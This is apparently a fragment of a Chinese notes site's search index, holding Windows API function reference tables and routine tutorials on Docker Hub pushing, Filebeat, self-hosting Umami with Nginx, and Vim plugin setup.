ConnectToPrinterDlg 启动连接打印机对话框，用它同访问网络的打印机连接 DeleteForm 从打印机可用表单列表中删除一个表单 DeleteMonitor 删除指定的打印监视器 DeletePort 启动\"删除端口\"对话框，允许用户从当前系统删除一个端口 DeletePrinter 将指定的打印机标志为从系统中删除 DeletePrinterConnection 删除与指定打印机的连接 DeletePrinterDriver 从系统删除一个打印机驱动程序 DeletePrintProcessor 从指定系统删除一个打印处理器 DeletePrintProvidor 从系统中删除一个打印供应商 DeviceCapabilities 利用这个函数可获得与一个设备的能力有关的信息 DocumentProperties 打印机配置控制函数 EndDocAPI 结束一个成功的打印作业 EndDocPrinter 在后台打印程序的级别指定一个文档的结束 EndPage 用这个函数完成一个页面的打印，并准备设备场景，以便打印下一个页 EndPagePrinter 指定一个页在打印作业中的结尾 EnumForms 枚举一台打印机可用的表单 EnumJobs 枚举打印队列中的作业 EnumMonitors 枚举可用的打印监视器 EnumPorts 枚举一个系统可用的端口 EnumPrinterDrivers 枚举指定系统中已安装的打印机驱动程序 EnumPrinters 枚举系统中安装的打印机 EnumPrintProcessorDatatypes 枚举由一个打印处理器支持的数据类型 EnumPrintProcessors 枚举系统中可用的打印处理器 Escape 设备控制函数 FindClosePrinterChangeNotification 关闭用FindFirstPrinterChangeNotification函数获取的一个打印机通告对象 FindFirstPrinterChangeNotification 创建一个新的改变通告对象，以便我们注意打印机状态的各种变化 FindNextPrinterChangeNotification 用这个函数判断触发一次打印机改变通告信号的原因 FreePrinterNotifyInfo 释放由FindNextPrinterChangeNotification函数分配的一个缓冲区 GetForm 取得与指定表单有关的信息 GetJob 获取与指定作业有关的信息 GetPrinter 取得与指定打印机有关的信息 GetPrinterData 为打印机设置注册表配置信息 GetPrinterDriver 针对指定的打印机，获取与打印机驱动程序有关的信息 GetPrinterDriverDirectory 判断指定系统中包含了打印机驱动程序的目录是什么 GetPrintProcessorDirectory 判断指定系统中包含了打印机处理器驱动程序及文件的目录 OpenPrinter 打开指定的打印机，并获取打印机的句柄 PrinterMessageBox 在拥有指定打印作业的系统上显示一个打印机出错消息框 PrinterProperties 启动打印机属性对话框，以便对打印机进行配置 ReadPrinter 从打印机读入数据 ResetDC 重设一个设备场景 ResetPrinter 改变指定打印机的默认数据类型及文档设置 ScheduleJob 提交一个要打印的作业 SetAbortProc 为Windows指定取消函数的地址 SetForm 为指定的表单设置信息 SetJob 对一个打印作业的状态进行控制 SetPrinter 对一台打印机的状态进行控制 SetPrinterData 设置打印机的注册表配置信息 StartDoc 开始一个打印作业 StartDocPrinter 在后台打印的级别启动一个新文档 StartPage 打印一个新页前要先调用这个函数 StartPagePrinter 在打印作业中指定一个新页的开始 WritePrinter 将发送目录中的数据写入打印机 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/6、文本和字体函数.html":{"url":"4.编程语言/Windows_API/6、文本和字体函数.html","title":"6、文本和字体函数","keywords":"","body":" 函数名 功能描述dows系统 AddFontResource 在Windows系统中添加一种字体资源dows系统 CreateFont 用指定的属性创建一种逻辑字体dows系统 CreateFontIndirect 用指定的属性创建一种逻辑字体dows系统 CreateScalableFontResource 为一种TureType字体创建一个资源文件，以便能用API函数AddFontResource将其加入Windows系统 DrawText 将文本描绘到指定的矩形中dows系统 DrawTextEx 与DrawText相似，只是加入了更多的功能dows系统 EnumFontFamilies 列举指定设备可用的字体dows系统 EnumFontFamiliesEx 列举指定设备可用的字体dows系统 EnumFonts 列举指定设备可用的字体dows系统 ExtTextOut 经过扩展的文本描绘函数。也请参考SetTextAlign函数dows系统 GetAspectRatioFilterEx 用SetMapperFlags要求Windows只选择与设备当前纵横比相符的光栅字体时，本函数可判断纵横比大小dows系统 GetCharABCWidths 判断TureType字体中一个或多个字符的A-B-C大小dows系统 GetCharABCWidthsFloat 查询一种字体中一个或多个字符的A-B-C尺寸dows系统 GetCharacterPlacement 该函数用于了解如何用一个给定的字符显示一个字串dows系统 GetCharWidth 调查字体中一个或多个字符的宽度dows系统 GetFontData 接收一种可缩放字体文件的数据dows系统 GetFontLanguageInfo 返回目前选入指定设备场景中的字体的信息dows系统 GetGlyphOutline 取得TureType字体中构成一个字符的曲线信息dows系统 GetKerningPairs 取得指定字体的字距信息dows系统 GetOutlineTextMetrics 接收与TureType字体内部特征有关的详细信息dows系统 GetRasterizerCaps 了解系统是否有能力支持可缩放的字体dows系统 GetTabbedTextExtent 判断一个字串占据的范围，同时考虑制表站扩充的因素dows系统 GetTextAlign 接收一个设备场景当前的文本对齐标志dows系统 GetTextCharacterExtra 判断额外字符间距的当前值dows系统 GetTextCharset 接收当前选入指定设备场景的字体的字符集标识符dows系统 GetTextCharsetInfo 获取与当前选定字体的字符集有关的详细信息dows系统 GetTextColor 判断当前字体颜色。通常也称为\"前景色\"dows系统 GetTextExtentExPoint 判断要填入指定区域的字符数量。也用一个数组装载每个字符的范围信息dows系统 GetTextExtentPoint 判断一个字串的大小（范围）dows系统 GetTextFace 获取一种字体的字样名dows系统 GetTextMetrics 获取与选入一种设备场景的物理字体有关的信息dows系统 GrayString 描绘一个以灰色显示的字串。通常由Windows用于标识禁止状态dows系统 PolyTextOut 描绘一系列字串dows系统 RemoveFontResource 从Windows系统中删除一种字体资源dows系统 SetMapperFlags Windows对字体进行映射时，可用该函数选择与目标设备的纵横比相符的光栅字体dows系统 SetTextAlign 设置文本对齐方式，并指定在文本输出过程中使用设备场景的当前位置dows系统 SetTextCharacterExtra 描绘文本的时候，指定要在字符间插入的额外间距dows系统 SetTextColor 设置当前文本颜色。这种颜色也称为\"前景色\"dows系统 SetTextJustification 通过指定一个文本行应占据的额外空间，可用这个函数对文本进行两端对齐处理dows系统 TabbedTextOut 支持制表站的一个文本描绘函数dows系统 TextOut 文本绘图函数dows系统 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/7、菜单函数.html":{"url":"4.编程语言/Windows_API/7、菜单函数.html","title":"7、菜单函数","keywords":"","body":" 函数名 功能描述 AppendMenu 在指定的菜单里添加一个菜单项 CheckMenuItem 复选或撤消复选指定的菜单条目 CheckMenuRadioItem 指定一个菜单条目被复选成\"单选\"项目 CreateMenu 创建新菜单 CreatePopupMenu 创建一个空的弹出式菜单 DeleteMenu 删除指定的菜单条目 DestroyMenu 删除指定的菜单 DrawMenuBar 为指定的窗口重画菜单 EnableMenuItem 允许或禁止指定的菜单条目 GetMenu 取得窗口中一个菜单的句柄 GetMenuCheckMarkDimensions 返回一个菜单复选符的大小 GetMenuContextHelpId 取得一个菜单的帮助场景ID GetMenuDefaultItem 判断菜单中的哪个条目是默认条目 GetMenuItemCount 返回菜单中条目（菜单项）的数量 GetMenuItemID 返回位于菜单中指定位置处的条目的菜单ID GetMenuItemInfo 取得（接收）与一个菜单条目有关的特定信息 GetMenuItemRect 在一个矩形中装载指定菜单条目的屏幕坐标信息 GetMenuState 取得与指定菜单条目状态有关的信息 GetMenuString 取得指定菜单条目的字串 GetSubMenu 取得一个弹出式菜单的句柄，它位于菜单中指定的位置 GetSystemMenu 取得指定窗口的系统菜单的句柄 HiliteMenuItem 控制顶级菜单条目的加亮显示状态 InsertMenu 在菜单的指定位置处插入一个菜单条目，并根据需要将其他条目向下移动 InsertMenuItem 插入一个新菜单条目 IsMenu 判断指定的句柄是否为一个菜单的句柄 LoadMenu 从指定的模块或应用程序实例中载入一个菜单 LoadMenuIndirect 载入一个菜单 MenuItemFromPoint 判断哪个菜单条目包含了屏幕上一个指定的点 ModifyMenu 改变菜单条目 RemoveMenu 删除指定的菜单条目 SetMenu 设置窗口菜单 SetMenuContextHelpId 设置一个菜单的帮助场景ID SetMenuDefaultItem 将一个菜单条目设为默认条目 SetMenuItemBitmaps 设置一幅特定位图，令其在指定的菜单条目中使用，代替标准的复选符号（√） SetMenuItemInfo 为一个菜单条目设置指定的信息 TrackPopupMenu 在屏幕的任意地方显示一个弹出式菜单 TrackPopupMenuEx 与TrackPopupMenu相似，只是它提供了额外的功能 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/8、位图、图标和光栅运算函数.html":{"url":"4.编程语言/Windows_API/8、位图、图标和光栅运算函数.html","title":"8、位图、图标和光栅运算函数","keywords":"","body":" 函数名 功能描述 BitBlt 将一幅位图从一个设备场景复制到另一个 CopyIcon 制作指定图标或鼠标指针的一个副本。这个副本从属于发出调用的应用程序 CopyImage 复制位图、图标或指针，同时在复制过程中进行一些转换工作 CreateBitmap 按照规定的格式创建一幅与设备有关位图 CreateBitmapIndirect 创建一幅与设备有关位图 CreateCompatibleBitmap 创建一幅与设备有关位图，它与指定的设备场景兼容 CreateCursor 创建一个鼠标指针 CreateDIBitmap 根据一幅与设备无关的位图创建一幅与设备有关的位图 CreateDIBSection 创建一个DIBSection CreateIcon 创建一个图标 CreateIconIndirect 创建一个图标 DestroyCursor 清除指定的鼠标指针，并释放它占用的所有系统资源 DestroyIcon 清除图标 DrawIcon 在指定的位置画一个图标 DrawIconEx 描绘一个图标或鼠标指针。与DrawIcon相比，这个函数提供了更多的功能 ExtractAssociatedIcon 判断一个可执行程序或DLL中是否存在图标，或是否有图标与系统注册表中指定的文件存在关联并提取之 ExtractIcon 判断一个可执行文件或DLL中是否有图标存在，并将其提取出来 GetBitmapBits 将来自位图的二进制位复制到一个缓冲区 GetBitmapDimensionEx 取得一幅位图的宽度和高度 GetDIBColorTable 从选入设备场景的DIBSection中取得颜色表信息 GetDIBits 将来自一幅位图的二进制位复制到一幅与设备无关的位图里 GetIconInfo 取得与图标有关的信息 GetStretchBltMode 判断StretchBlt LoadBitmap 从指定的模块或应用程序实例中载入一幅位图 LoadCursor 从指定的模块或应用程序实例中载入一个鼠标指针 LoadCursorFromFile 在一个指针文件或一个动画指针文件的基础上创建一个指针 LoadIcon 从指定的模块或应用程序实例中载入一个图标 LoadImage 载入一个位图、图标或指针 MaskBlt 执行复杂的图象传输，同时进行掩模（MASK）处理 PatBlt 在当前选定的刷子的基础上，用一个图案填充指定的设备场景 PlgBlt 复制一幅位图，同时将其转换成一个平行四边形。利用它可对位图进行旋转处理 SetBitmapBits 将来自缓冲区的二进制位复制到一幅位图 SetBitmapDimensionEx 设置一幅位图的宽度。以一毫米的十分之一为单位 SetDIBColorTable 设置选入设备场景的一个DIBSection的颜色表信息 SetDIBits 将来自与设备无关位图的二进制位复制到一幅与设备有关的位图里 SetDIBitsToDevice 将一幅与设备无关位图的全部或部分数据直接复制到一个设备 SetStretchBltMode 指定StretchBlt StretchBlt 将一幅位图从一个设备场景复制到另一个 StretchDIBits 将一幅与设备无关位图的全部或部分数据直接复制到指定的设备场景 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/9、绘图函数.html":{"url":"4.编程语言/Windows_API/9、绘图函数.html","title":"9、绘图函数","keywords":"","body":" 函数名 功能描述 AbortPath 抛弃选入指定设备场景中的所有路径。也取消目前正在进行的任何路径的创建工作 AngleArc 用一个连接弧画一条线 Arc 画一个圆弧 BeginPath 启动一个路径分支 CancelDC 取消另一个线程里的长时间绘图操作 Chord 画一个弦 CloseEnhMetaFile 关闭指定的增强型图元文件设备场景，并将新建的图元文件返回一个句柄 CloseFigure 描绘到一个路径时，关闭当前打开的图形 CloseMetaFile 关闭指定的图元文件设备场景，并向新建的图元文件返回一个句柄 CopyEnhMetaFile 制作指定增强型图元文件的一个副本（拷贝） CopyMetaFile 制作指定（标准）图元文件的一个副本 CreateBrushIndirect 在一个LOGBRUSH数据结构的基础上创建一个刷子 CreateDIBPatternBrush 用一幅与设备无关的位图创建一个刷子，以便指定刷子样式（图案） CreateEnhMetaFile 创建一个增强型的图元文件设备场景 CreateHatchBrush 创建带有阴影图案的一个刷子 CreateMetaFile 创建一个图元文件设备场景 CreatePatternBrush 用指定了刷子图案的一幅位图创建一个刷子 CreatePen 用指定的样式、宽度和颜色创建一个画笔 CreatePenIndirect 根据指定的LOGPEN结构创建一个画笔 CreateSolidBrush 用纯色创建一个刷子 DeleteEnhMetaFile 删除指定的增强型图元文件 DeleteMetaFile 删除指定的图元文件 DeleteObject 删除GDI对象，对象使用的所有系统资源都会被释放 DrawEdge 用指定的样式描绘一个矩形的边框 DrawEscape 换码（Escape）函数将数据直接发至显示设备驱动程序 DrawFocusRect 画一个焦点矩形 DrawFrameControl 描绘一个标准控件 DrawState 为一幅图象或绘图操作应用各式各样的效果 Ellipse 描绘一个椭圆，由指定的矩形围绕 EndPath 停止定义一个路径 EnumEnhMetaFile 针对一个增强型图元文件，列举其中单独的图元文件记录 EnumMetaFile 为一个标准的windows图元文件枚举单独的图元文件记录 EnumObjects 枚举可随同指定设备场景使用的画笔和刷子 ExtCreatePen 创建一个扩展画笔（装饰或几何） ExtFloodFill 在指定的设备场景里，用当前选择的刷子填充一个区域 FillPath 关闭路径中任何打开的图形，并用当前刷子填充 FillRect 用指定的刷子填充一个矩形 FlattenPath 将一个路径中的所有曲线都转换成线段 FloodFill 用当前选定的刷子在指定的设备场景中填充一个区域 FrameRect 用指定的刷子围绕一个矩形画一个边框 GdiComment 为指定的增强型图元文件设备场景添加一条注释信息 GdiFlush 执行任何未决的绘图操作 GdiGetBatchLimit 判断有多少个GDI绘图命令位于队列中 GdiSetBatchLimit 指定有多少个GDI绘图命令能够进入队列 GetArcDirection 画圆弧的时候，判断当前采用的绘图方向 GetBkColor 取得指定设备场景当前的背景颜色 GetBkMode 针对指定的设备场景，取得当前的背景填充模式 GetBrushOrgEx 判断指定设备场景中当前选定刷子起点 GetCurrentObject 获得指定类型的当前选定对象 GetCurrentPositionEx 在指定的设备场景中取得当前的画笔位置 GetEnhMetaFile 取得磁盘文件中包含的一个增强型图元文件的图元文件句柄 GetEnhMetaFileBits 将指定的增强型图元文件复制到一个内存缓冲区里 GetEnhMetaFileDescription 返回对一个增强型图元文件的说明 GetEnhMetaFileHeader 取得增强型图元文件的图元文件头 GetEnhMetaFilePaletteEntries 取得增强型图元文件的全部或部分调色板 GetMetaFile 取得包含在一个磁盘文件中的图元文件的图元文件句柄 GetMetaFileBitsEx 将指定的图元文件复制到一个内存缓冲区 GetMiterLimit 取得设备场景的斜率限制（Miter）设置 GetNearestColor 根据设备的显示能力，取得与指定颜色最接近的一种纯色 GetObjectAPI 取得对指定对象进行说明的一个结构 GetObjectType 判断由指定句柄引用的GDI对象的类型 GetPath 取得对当前路径进行定义的一系列数据 GetPixel 在指定的设备场景中取得一个像素的RGB值 GetPolyFillMode 针对指定的设备场景，获得多边形填充模式 GetROP2 针对指定的设备场景，取得当前的绘图模式 GetStockObject 取得一个固有对象（Stock） GetSysColorBrush 为任何一种标准系统颜色取得一个刷子 GetWinMetaFileBits 通过在一个缓冲区中填充用于标准图元文件的数据，将一个增强型图元文件转换成标准windows图元文件 InvertRect 通过反转每个像素的值，从而反转一个设备场景中指定的矩形 LineDDA 枚举指定线段中的所有点 LineTo 用当前画笔画一条线，从当前位置连到一个指定的点 MoveToEx 为指定的设备场景指定一个新的当前画笔位置 PaintDesk 在指定的设备场景中描绘桌面墙纸图案 PathToRegion 将当前选定的路径转换到一个区域里 Pie 画一个饼图 PlayEnhMetaFile 在指定的设备场景中画一个增强型图元文件 PlayEnhMetaFileRecord 回放单独一条增强型图元文件记录 PlayMetaFile 在指定的设备场景中回放一个图元文件 PlayMetaFileRecord 回放来自图元文件的单条记录 PolyBezier 描绘一条或多条贝塞尔（Bezier）曲线 PolyDraw 描绘一条复杂的曲线，由线段及贝塞尔曲线组成 Polygon 描绘一个多边形 Polyline 用当前画笔描绘一系列线段 PolyPolygon 用当前选定画笔描绘两个或多个多边形 PolyPolyline 用当前选定画笔描绘两个或多个多边形 Rectangle 用当前选定的画笔描绘矩形，并用当前选定的刷子填充 RoundRect 用当前选定的画笔画一个圆角矩形，并用当前选定的刷子在其中填充 SelectClipPath 将设备场景当前的路径合并到剪切区域里 SelectObject 为当前设备场景选择图形对象 SetArcDirection 设置圆弧的描绘方向 SetBkColor 为指定的设备场景设置背景颜色 SetBkMode 指定阴影刷子、虚线画笔以及字符中的空隙的填充方式 SetBrushOrgEx 为指定的设备场景设置当前选定刷子的起点 SetEnhMetaFileBits 用指定内存缓冲区内包含的数据创建一个增强型图元文件 SetMetaFileBitsEx 用包含在指定内存缓冲区内的数据结构创建一个图元文件 SetMiterLimit 设置设备场景当前的斜率限制 SetPixel 在指定的设备场景中设置一个像素的RGB值 SetPixelV 在指定的设备场景中设置一个像素的RGB值 SetPolyFillMode 设置多边形的填充模式 SetROP2 设置指定设备场景的绘图模式。与vb的DrawMode属性完全一致 SetWinMetaFileBits 将一个标准Windows图元文件转换成增强型图元文件 StrokeAndFillPath 针对指定的设备场景，关闭路径上打开的所有区域 StrokePath 用当前画笔描绘一个路径的轮廓。打开的图形不会被这个函数关闭 UnrealizeObject 将一个刷子对象选入设备场景之前，如刷子的起点准备用SetBrushOrgEx修改，则必须先调用本函数 WidenPath 根据选定画笔的宽度，重新定义当前选定的路径 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Docker推送镜像至仓库.html":{"url":"2.系统运维/Docker推送镜像至仓库.html","title":"Docker推送镜像至仓库","keywords":"","body":"1、Docker hub创建仓库 官网注册账号：https://hub.docker.com/ 登陆后进入仓库界面创建仓库 输入仓库名和描述(可选)进行创建，记住仓库选择公开 2、在本地shell登录docker [root@localhost ~]# docker login Log in with your Docker ID or email address to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com/ to create one. You can log in with your password or a Personal Access Token (PAT). Using a limited-scope PAT grants better security and is required for organizations using SSO. Learn more at https://docs.docker.com/go/access-tokens/ Username: xxxx Password: WARNING! Your password will be stored unencrypted in /home/feiyu/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credential-stores Login Succeeded 3、查看需推送镜像 [root@localhost ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos 7.9.2009 eeb6ee3f44bd 2 years ago 204MB 4、给镜像修改标签与名称 规范：docker tag 原镜像名:原镜像tag dockerhub用户名/仓库名:标签 [root@localhost ~]# docker tag centos:7.9.2009 user/centos7.9:stable [root@localhost ~]# docker images ls REPOSITORY TAG IMAGE ID CREATED SIZE user/centos7.9 stable 853aab1a35f1 27 minutes ago 204MB 5、Push到DockerHub仓库 [root@localhost ~]# docker push user/centos7.9:stable 之后可以在自己dockerhub账号的仓库中看到push的镜像，测试也可以正常pull下来到本地 6、配置代理 Dockerd 代理 在执行docker pull时，是由守护进程dockerd来执行。因此，代理需要配在dockerd的环境中。而这个环境，则是受systemd所管控，因此实际是systemd的配置。 sudo mkdir -p /etc/systemd/system/docker.service.d sudo touch /etc/systemd/system/docker.service.d/proxy.conf 在这个proxy.conf文件（可以是任意*.conf的形式）中，添加以下内容： [Service] Environment=\"HTTP_PROXY=http://127.0.0.1:7893/\" Environment=\"HTTPS_PROXY=http://127.0.0.1:7893/\" Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\" 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:43 "},"2.系统运维/Filebeat安装配置.html":{"url":"2.系统运维/Filebeat安装配置.html","title":"Filebeat安装配置","keywords":"","body":"Ubuntu 添加ElasticSearch的GPG密钥 wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - 添加ElasticSearch的APT存储库 echo \"deb https://artifacts.elastic.co/packages/oss-8.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-8.x.list 更新APT软件包索引 sudo apt update 安装filebeat sudo apt install filebeat 配置filebeat sudo vim /etc/filebeat/filebeat.yml 全部替换为以下内容 processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ # ============================== Filebeat inputs =============================== filebeat.inputs: - type: log enabled: true paths: - /var/log/nginx/*.log # tags更改分别更改为日志应用和主机ip，后续分别对应日志文件名称 tags: [\"nginx\", \"[主机ip]\"] filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false # ============================== Filebeat output =============================== # 直接发送给elasticsearch #output.elasticsearch: # username: 'elastic' # password: 'elastic_password' # hosts: [\"http://日志服务器ip:9200\"] # indices: # - index: \"nginx-%{+yyyy.MM.dd}\" # 发送给logstash output.logstash: hosts: [\"日志服务器ip:5044\"] enabled: true 启动filebeat sudo systemctl enable filebeat sudo systemctl start filebeat Centos 一. 直接yum方式安装 yum install filebeat 二. 配置filebeat sudo vim /etc/filebeat/filebeat.yml 全部替换为以下内容 processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ # ============================== Filebeat inputs =============================== filebeat.inputs: - type: log enabled: true paths: - /var/log/nginx/*.log # tags更改分别更改为日志应用和主机ip，后续分别对应日志文件名称 tags: [\"nginx\", \"[主机ip]\"] filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false # ============================== Filebeat output =============================== # 直接发送给elasticsearch #output.elasticsearch: # username: 'elastic' # password: 'elastic_password' # hosts: [\"http://日志服务器ip:9200\"] # indices: # - index: \"nginx-%{+yyyy.MM.dd}\" # 发送给logstash output.logstash: hosts: [\"日志服务器ip:5044\"] enabled: true 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:46 "},"2.系统运维/Umami搭建.html":{"url":"2.系统运维/Umami搭建.html","title":"Umami搭建","keywords":"","body":"前言 软件需求： MySQL/MariaDB：Umami数据存放。 Nginx：使用Nginx，对umami的默认3000端口进行反向代理。 Nodejs 1. 克隆仓库 git clone https://github.com/umami-software/umami.git 2. 安装依赖 # 进入刚刚克隆的仓库内 cd umami # 使用npm进行依赖安装 npm install 3. 创建数据库 创建用户 确保已经安装了MySQL或者MariaDB，由于两则具有包含兼容关系，可以使用相同的命令 # 登录数据库 mysql -u root -p # 创建一个用户umami，密码为password，并仅允许本机登录 CREATE USER 'umami'@'localhost' IDENTIFIED BY 'password'; # 创建一个数据库umami CREATE DATABASE umami; # 赋予权限 GRANT ALL ON umami.* TO 'umami'@'localhost'; 初始化数据库(V2版本忽略) mysql -u umami -p umami 其中： -u umami：使用umami账户； -p umami：理论上 -p 代表使用密码，这里代表使用密码访问，umami代表访问的数据库。 4. 环境配置 umami需要我们配置一个.env的环境在umami根目录，umami会读取这个文件进行数据库的连接 使用vim .env编辑文件 DATABASE_URL=mysql://umami:password@localhost:3306/umami HASH_SALT=suijizifu TRACKER_SCRIPT_NAME=random-string.js 其中： 第一个umami为用户名 password为用户密码 第二个umami为数据库 HASH_SALT为Hash加盐字符，任意字符串即可 TRACKER_SCRIPT_NAME可以使umami绕过广告屏蔽插件的影响 5. 构建运行 npm run build npm start 6. 后台服务运行 此时umami已经搭建完成，但是直接使用npm启动的话只能在前台运行，远程登录关闭之后就会退出，所以这里使用systemctl来管理该服务 编辑/etc/systemd/system/umami.service 文件，写入以下内容： [Unit] Description=UmamiServer [Service] Type=simple User=user ExecStart=/usr/local/bin/cnpm start --prefix /path/umami Restart=always Environment=PATH=/usr/bin:/usr/local/bin:/userhomepath/.nvm/versions/node/v20.16.0/bin Environment=NODE_ENV=production WorkingDirectory=/path/umami [Install] WantedBy=multi-user.target 其中： User选项是运行时的用户名 ExecStart中的/usr/local/bin/cnpm是npm的安装位置，我这里使用的是cnpm运行软件，也可以选择npm的位置； /userhomepath/.nvm/versions/node/v20.16.0/bin 使由于本人使用的nvm管理nodejs版本，这里选择nvm安装对应node版本的路径，前面是用户目录； /path/umami是umami所在目录。 7. Nginx反向代理并与Halo搭配 为了能使用Https访问，或者说用443、80端口访问，而不用IP登录，这里使用nginx进行反向代理 # 安装nginx sudo apt-get install nginx -y 为了同时与Halo搭配，这里需要提前在halo后台下载umami插件； 再编辑默认配置文件/etc/nginx/sites-available/default，填入以下配置： server { listen 80; listen [::]:80; # 域名 server_name [umami.domain.com]; # 重定向至https return 301 https://$host$request_uri; } server { listen 443 ssl http2; server_name [umami.domain.com]; # SSL配置 ssl on; ssl_certificate /etc/nginx/cert/[umami.domain.com].pem; ssl_certificate_key /etc/nginx/cert/[umami.domain.com].key; add_header Access-Control-Allow-Origin 'https://[halo.domain.com]'; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } add_header Content-Security-Policy 'frame-ancestors [halo.domain.com]'; # 反向代理 location / { proxy_pass http://localhost:3000; proxy_set_header HOST $host; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_hide_header 'Access-Control-Allow-Origin'; proxy_hide_header 'Content-Security-Policy'; } } 8. Halo插件配置 根据插件配置要求进行填写： 其中： Umami站点地址为Umami的域名地址 脚本名称2.x版本默认为script.js 站点ID是在Umami创建站点后，在站点设置编辑中可以查看 共享链接与站点ID一样在站点编辑中查看 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:49 "},"2.系统运维/Vim配置与美化.html":{"url":"2.系统运维/Vim配置与美化.html","title":"Vim配置与美化","keywords":"","body":"vim-plug下载 # Unix, Linux curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim # Windows (PowerShell) iwr -useb https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim |` ni $HOME/vimfiles/autoload/plug.vim -Force # Neovim ## Unix, Linux sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' ## Linux (Flatpak) curl -fLo ~/.var/app/io.neovim.nvim/data/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim ## Windows (PowerShell) iwr -useb https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim |` ni \"$(@($env:XDG_DATA_HOME, $env:LOCALAPPDATA)[$null -eq $env:XDG_DATA_HOME])/nvim-data/site/autoload/plug.vim\" -Force 插件安装 插件市场：vim awesome. 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:49 "},"联系我.html":{"url":"联系我.html","title":"联系我","keywords":"","body":"🏠 主页 网站地址：https://www.feiyunote.cn 🤝 反馈与建议 作者：睡觉的时候不困 邮箱：feiyunote@qq.com 我双手合十的愿望里永远有你。 穿越人海，只为与你相拥。 手握日月摘 ♥ 陈。 📝 版权 赣ICP备2023008387号-1 赣公网安备36052102100040号 ©2023-2024 睡觉的时候不困 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:16 "}}